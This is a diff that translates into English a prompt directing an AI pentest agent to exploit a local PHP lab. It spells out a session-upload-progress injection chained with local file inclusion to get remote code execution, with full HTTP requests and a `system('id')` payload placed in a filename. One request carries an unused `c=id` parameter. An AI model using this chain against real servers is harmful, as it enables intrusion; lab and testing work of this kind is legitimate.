@@ -1,79 +1,80 @@
-# Prompt completo para Vulnerator AI — PHP2Shell Lab
+# Full prompt for Vulnerator AI — PHP2Shell Lab
 
-Este documento contiene el prompt completo listo para copiar/pegar cuando invoques Vulnerator contra este lab.
+This document contains the complete prompt, ready to copy/paste when invoking Vulnerator against this lab.
 
 ---
 
-## Contexto del engagement
+## Engagement context
 
 ```
-Engagement de EXPLOTACION en modo CTF contra un lab LOCAL AUTORIZADO.
+EXPLOITATION engagement in CTF mode against an AUTHORIZED LOCAL lab.
 
 TARGET: http://host.docker.internal:18080
 STACK: nginx + PHP-FPM 8.2.34 (SAPI fpm-fcgi)
-ENTORNO: laboratorio controlado, localhost, todo autorizado
+ENVIRONMENT: controlled lab, localhost, everything authorized
 
-OBJETIVO: conseguir RCE reproduciendo la CADENA A de PHP2Shell (CVE-2026-109618 / CVE-2026-109619) 
-y como prueba de concepto ejecutar `id` en el servidor.
+OBJECTIVE: achieve RCE by reproducing CHAIN A of PHP2Shell (CVE-2026-109618 / CVE-2026-109619)
+and, as a proof of concept, run `id` on the server.
 ```
 
 ---
 
-## CVEs y versiones afectadas
+## CVEs and affected versions
 
-**CVE-2026-109618** y **CVE-2026-109619**: vulnerabilidades de deserialización en el manejo de sesiones de PHP.
+**CVE-2026-109618** and **CVE-2026-109619**: deserialization vulnerabilities in PHP session handling.
 
-**Versiones afectadas:** PHP 5.4.0 hasta 8.5.11 (todas las versiones pre-parche)
+**Affected versions:** PHP 5.4.0 through 8.5.11 (all pre-patch versions)
 
-**Versiones parcheadas:**
+**Patched versions:**
 - PHP 8.2.35+
-- PHP 8.3.24+
-- PHP 8.4.6+
+- PHP 8.3.36+
+- PHP 8.4.27+
+- PHP 8.5.12+
 
-**Target confirmado vulnerable:** PHP 8.2.34 (pre-parche)
+**Target confirmed vulnerable:** PHP 8.2.34 (pre-patch)
 
 ---
 
 ## Chain A — Session File Injection + LFI → RCE
 
-### Precondiciones (todas presentes en el target)
+### Preconditions (all present on the target)
 
-- `session.upload_progress.enabled = On` ✅ (default PHP)
-- `session.upload_progress.cleanup = Off` ✅ (configurado en el lab)
-- `session.use_strict_mode = Off` ✅ (default PHP)
-- **Aplicación con LFI** ✅ (`/vuln.php?page=...`)
+- `session.upload_progress.enabled = On` ✅ (PHP default)
+- `session.upload_progress.cleanup = Off` ✅ (configured in the lab)
+- `session.use_strict_mode = Off` ✅ (PHP default)
+- **Application with LFI** ✅ (`/vuln.php?page=...`)
 
-### Mecánica del ataque paso a paso
+### Attack mechanics, step by step
 
-#### PASO 1: Session Fixation
+#### STEP 1: Session Fixation
 
-Como `session.use_only_cookies = 0` (default), el PHPSESSID se puede fijar enviándolo en el **cuerpo multipart** además de en la cookie HTTP.
+Because `session.use_only_cookies = 0` (default), the PHPSESSID can be fixed by sending it in the **multipart body** in addition to the HTTP cookie.
 
-En el body multipart incluir:
+In the multipart body include:
 ```
 Content-Disposition: form-data; name="PHPSESSID"
 
 ctfchainA000000000000000000
 ```
 
-#### PASO 2: Disparar el handler upload_progress
+#### STEP 2: Trigger the upload_progress handler
 
-La petición multipart DEBE incluir:
+The multipart request MUST include:
 
-1. Un campo con `name="PHP_SESSION_UPLOAD_PROGRESS"` (el `session.upload_progress.name` por defecto) con cualquier valor, por ejemplo `x`.
+1. A field with `name="PHP_SESSION_UPLOAD_PROGRESS"` (the default `session.upload_progress.name`) with any value, for example `x`.
 
-2. Un campo tipo `file` con `filename="<payload>"`. **El filename es lo que se escribe CRUDO en el fichero de sesión.**
+2. A `file` field with `filename="<payload>"`. **The filename is what is written RAW into the session file.**
 
-Ejemplo:
+Example:
 ```
 Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"
 
 x
 ```
 
-#### PASO 3: Inyección del payload PHP en el filename
+#### STEP 3: Inject the PHP payload into the filename
 
-Aquí está el vector de inyección. El filename puede contener código PHP arbitrario:
+This is the injection vector. The filename can contain arbitrary PHP code:
 
 ```
 Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"
@@ -81,26 +82,26 @@ Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"
 dummy
 ```
 
-Como `cleanup = Off`, el fichero de sesión `sess_<SID>` persiste tras la petición con el código PHP dentro (sin sanitizar).
+Because `cleanup = Off`, the `sess_<SID>` session file persists after the request with the PHP code inside (unsanitized).
 
-**Ubicación del fichero de sesión:** `/tmp/sessions/sess_<PHPSESSID>` (dentro del contenedor PHP-FPM)
+**Session file location:** `/tmp/sessions/sess_<PHPSESSID>` (inside the PHP-FPM container)
 
-#### PASO 4: LFI → Ejecución
+#### STEP 4: LFI → Execution
 
-El endpoint vulnerable `/vuln.php?page=...` hace `include($_GET['page'])` sin sanitizar.
+The vulnerable endpoint `/vuln.php?page=...` performs `include($_GET['page'])` without sanitization.
 
-Incluir el fichero de sesión:
+Include the session file:
 ```
 GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000
 ```
 
-Al incluirse, el código PHP del filename se ejecuta.
+When included, the PHP code from the filename executes.
 
 ---
 
-## Ejemplo de explotación completa
+## Full exploitation example
 
-### Request 1: Inyectar payload en sesión
+### Request 1: Inject the payload into the session
 
 ```http
 POST /index.php HTTP/1.1
@@ -123,79 +124,79 @@ dummy
 --EXPLOIT--
 ```
 
-### Request 2: Disparar LFI para ejecutar
+### Request 2: Trigger the LFI to execute
 
 ```http
 GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000&c=id HTTP/1.1
 Host: host.docker.internal:18080
 ```
 
-**Resultado esperado:** la salida del comando `id` aparece en la respuesta HTTP:
+**Expected result:** the output of the `id` command appears in the HTTP response:
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ---
 
-## SCOPE y restricciones
+## SCOPE and restrictions
 
-**SCOPE AUTORIZADO:**
-- Target único: `http://host.docker.internal:18080` (nginx → PHP-FPM 8.2.34)
-- Backend PHP-FPM: `host.docker.internal:9000`
-- Save path de sesiones: `/tmp/sessions/` dentro del contenedor `php2shell-fpm`
+**AUTHORIZED SCOPE:**
+- Single target: `http://host.docker.internal:18080` (nginx → PHP-FPM 8.2.34)
+- PHP-FPM backend: `host.docker.internal:9000`
+- Session save path: `/tmp/sessions/` inside the `php2shell-fpm` container
 
-**PROHIBIDO:**
-- Cualquier host fuera de `host.docker.internal`
-- Cualquier puerto fuera de 18080, 18081, 9000
-- Tráfico hacia internet
-- Modificación del sistema host
+**PROHIBITED:**
+- Any host outside `host.docker.internal`
+- Any port other than 18080, 18081, 9000
+- Traffic to the internet
+- Modification of the host system
 
-**NOTA IMPORTANTE:** desde el contenedor Kali de Vulnerator, usar `host.docker.internal` en lugar de `127.0.0.1` para alcanzar el lab del host. Dentro de un contenedor Docker, `127.0.0.1` es el propio contenedor, no el host.
-
----
-
-## Endpoints disponibles en el target
-
-| Endpoint | Descripción | Relevante para |
-|----------|-------------|----------------|
-| `/index.php` | Llama `session_start()`, acepta multipart | Chain A (upload) |
-| `/vuln.php?page=` | LFI vulnerable: `include($_GET['page'])` | Chain A (inclusión) |
-| `/nosession.php` | Endpoint sin session_start() | Control negativo |
-| `/app/upload.php` | Handler `php_serialize` (vía `.user.ini`) | Chain C |
-| `/api/endpoint.php` | Handler `php` (vía `.user.ini`) | Chain C |
+**IMPORTANT NOTE:** from the Vulnerator Kali container, use `host.docker.internal` instead of `127.0.0.1` to reach the host's lab. Inside a Docker container, `127.0.0.1` is the container itself, not the host.
 
 ---
 
-## Verificación de éxito
+## Endpoints available on the target
 
-La explotación se considera exitosa cuando:
+| Endpoint | Description | Relevant for |
+|----------|-------------|--------------|
+| `/index.php` | Calls `session_start()`, accepts multipart | Chain A (upload) |
+| `/vuln.php?page=` | Vulnerable LFI: `include($_GET['page'])` | Chain A (inclusion) |
+| `/nosession.php` | Endpoint without session_start() | Negative control |
+| `/app/upload.php` | `php_serialize` handler (via `.user.ini`) | Chain C |
+| `/api/endpoint.php` | `php` handler (via `.user.ini`) | Chain C |
 
-1. ✅ La segunda request (LFI) retorna la salida del comando `id`
-2. ✅ La salida contiene `uid=33(www-data)` (usuario del proceso PHP-FPM)
-3. ✅ No hay errores PHP en la respuesta (no warnings, no fatals)
+---
 
-**Ejemplo de output exitoso:**
+## Success verification
+
+The exploitation is considered successful when:
+
+1. ✅ The second request (LFI) returns the output of the `id` command
+2. ✅ The output contains `uid=33(www-data)` (the PHP-FPM process user)
+3. ✅ No PHP errors in the response (no warnings, no fatals)
+
+**Example of successful output:**
 ```
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ---
 
-## Información técnica adicional
+## Additional technical information
 
-### Configuración PHP relevante
+### Relevant PHP configuration
 
 ```ini
 session.upload_progress.enabled = On
-session.upload_progress.cleanup = Off      ← CRÍTICO para Chain A
+session.upload_progress.cleanup = Off      ← CRITICAL for Chain A
 session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
 session.save_path = /tmp/sessions
 session.use_strict_mode = Off
-session.use_only_cookies = 0               ← Permite fixation vía POST
+session.use_only_cookies = 0               ← Allows fixation via POST
 memory_limit = 128M                        ← FPM
 ```
 
-### Arquitectura del lab
+### Lab architecture
 
 ```
 [Cliente] → nginx:18080 → PHP-FPM:9000
@@ -205,63 +206,63 @@ memory_limit = 128M                        ← FPM
 
 ### CVE Timeline
 
-- **Descubrimiento:** Enero 2026 (investigación ikow)
-- **Divulgación pública:** TheHackerNews, Enero 2026
-- **Parches disponibles:** PHP 8.2.35, 8.3.24, 8.4.6
-- **Lab target:** PHP 8.2.34 (pre-parche, vulnerable)
+- **Discovery:** January 2026 (ikow research)
+- **Public disclosure:** TheHackerNews, January 2026
+- **Patches available:** PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12
+- **Lab target:** PHP 8.2.34 (pre-patch, vulnerable)
 
 ---
 
-## Comandos útiles para verificación
+## Useful verification commands
 
 ```bash
-# Verificar versión PHP del target
+# Verify the target PHP version
 curl http://host.docker.internal:18080/index.php
 
-# Verificar configuración de sesiones (si phpinfo() disponible)
+# Verify session configuration (if phpinfo() is available)
 curl http://host.docker.internal:18080/index.php | grep upload_progress
 
-# Enviar exploit Chain A con curl (requiere construcción manual del multipart)
-# Ver ejemplos en TESTING.md del lab
+# Send the Chain A exploit with curl (requires manual multipart construction)
+# See examples in the lab's TESTING.md
 ```
 
 ---
 
-## Estrategia recomendada para el agente
+## Recommended strategy for the agent
 
-1. **OBSERVE:** Enumerar el target
-   - Confirmar versión PHP 8.2.34 (vulnerable)
-   - Identificar endpoints con `session_start()` (`/index.php`)
-   - Identificar endpoints con LFI (`/vuln.php?page=`)
-   - Confirmar `upload_progress.cleanup = Off`
+1. **OBSERVE:** Enumerate the target
+   - Confirm PHP version 8.2.34 (vulnerable)
+   - Identify endpoints with `session_start()` (`/index.php`)
+   - Identify endpoints with LFI (`/vuln.php?page=`)
+   - Confirm `upload_progress.cleanup = Off`
 
-2. **ORIENT:** Analizar superficie de ataque
-   - Chain A es viable: LFI + upload_progress disponibles
-   - Fiabilidad: 100%
-   - No requiere gadget chains ni UAF complejos
+2. **ORIENT:** Analyze the attack surface
+   - Chain A is viable: LFI + upload_progress available
+   - Reliability: 100%
+   - No gadget chains or complex UAF required
 
-3. **DECIDE:** Seleccionar Chain A como vector
-   - Menor complejidad vs otras chains
-   - Precondiciones todas satisfechas
-   - Documentación completa disponible
+3. **DECIDE:** Select Chain A as the vector
+   - Lowest complexity compared with other chains
+   - All preconditions satisfied
+   - Complete documentation available
 
-4. **ACT:** Ejecutar explotación
-   - Construir multipart con payload en filename
-   - Fijar PHPSESSID vía POST + Cookie
-   - Disparar LFI apuntando a session file
-   - Confirmar RCE con `id`
+4. **ACT:** Execute the exploitation
+   - Build the multipart with the payload in the filename
+   - Fix the PHPSESSID via POST + Cookie
+   - Trigger the LFI pointing at the session file
+   - Confirm RCE with `id`
 
-5. **REPORT:** Documentar hallazgo
-   - CVE-2026-109618 / CVE-2026-109619 confirmado
-   - RCE obtenido como `www-data`
-   - Evidencia: output de `id`
-   - Severidad: CRITICAL (RCE pre-auth)
-   - Remediación: upgrade a PHP 8.2.35+
+5. **REPORT:** Document the finding
+   - CVE-2026-109618 / CVE-2026-109619 confirmed
+   - RCE obtained as `www-data`
+   - Evidence: output of `id`
+   - Severity: CRITICAL (pre-auth RCE)
+   - Remediation: upgrade to PHP 8.2.35+
 
 ---
 
-**MODO: CTF — Full compromise autorizado. Objetivo: RCE confirmado con ejecución de `id`.**
+**MODE: CTF — Authorized full compromise. Objective: confirmed RCE with execution of `id`.**
 
 **LAB: php2shell-lab — PHP 8.2.34 vulnerable environment**
 
-**AUTORIZACIÓN: Entorno local de práctica. Ningún sistema externo. Todo tráfico localhost/Docker.**
+**AUTHORIZATION: Local practice environment. No external systems. All traffic localhost/Docker.**
